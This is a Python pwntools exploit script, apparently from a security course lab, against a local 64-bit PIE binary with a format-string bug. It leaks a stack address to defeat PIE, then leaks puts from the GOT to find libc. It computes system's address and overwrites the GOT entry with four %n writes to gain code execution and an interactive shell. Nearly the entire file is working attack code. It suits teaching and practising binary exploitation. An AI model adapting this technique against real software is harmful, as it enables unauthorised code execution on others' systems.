#!/usr/bin/env python

from pwn import *
import os

env = {
        "PATH": "/home/users/didnera/week6/e-fs-code-exec-pie-64"
        }

'''
context.terminal = ['tmux','splitw', '-h']
p = process('./gs-code-exec-64')
gdb.attach(p)
raw_input()
'''

p = process("./fs-code-exec-pie-64", env = env)

print(p.recv(timeout= 0.1))



p.sendline("%42$pAAA")


data = p.recv()
print(data)

cut = int(data[8:20], 16)
print(hex(cut))





#code exec - 64


#arb read
#GOT of printf
got_of_puts = cut + 0x228

#print(hex(got_of_printf))
#p.sendline("ABCDABCD" + "%6$p")

p.sendline(("%7$sAAAA" + p64(got_of_puts)))


data = p.recv(timeout=0.1)


libc_puts = data[14:20]
libc_puts = libc_puts + "\x00\x00"

libc_puts = u64(libc_puts)


print(repr(data))

print("libc_puts: " + hex(libc_puts))

'''
pwndbg> print puts
$3 = {<text variable, no debug info>} 0x7f2161c5a690 <_IO_puts>
pwndbg> print system
$4 = {<text variable, no debug info>} 0x7f2161c30390 <__libc_system>
'''


libc_system = libc_puts - 0x7f2161c5a690 + 0x7f2161c30390

print("")
print("libc_system")
print(hex(libc_system))



lower = libc_system & 0xffff
print("first: " + hex(lower))
mid = ((libc_system >> 16) & 0xffff)
print("second: " + hex(mid))
upper = ((libc_system >> 32) & 0xffff)
print("third: " + hex(upper))


raw_input()


first = lower

second = mid - lower

while second < 0:
    second += 0x10000

third = upper - mid

while third < 0:
    third += 0x10000

fourth = 0x10000 - upper

print("1: "+ hex(first))
print("2: " + hex(second))
print("3: " + hex(third))
print("4: " + hex(fourth))


#got_of_puts -= 1

buf  = "%" + "%05d" % first + "x"
buf += "%12$n"
buf += "%" + "%05d" % second + "x"
buf += "%13$n"
buf += "%"+ "%05d" % third + "x"
buf += "%14$n"
buf += "%" + "%05d" % fourth + "x"
buf += "%15$n"
buf += p64(got_of_puts) + p64(got_of_puts + 2) + p64(got_of_puts + 4) + p64(got_of_puts + 6)




p.sendline(buf)


p.interactive()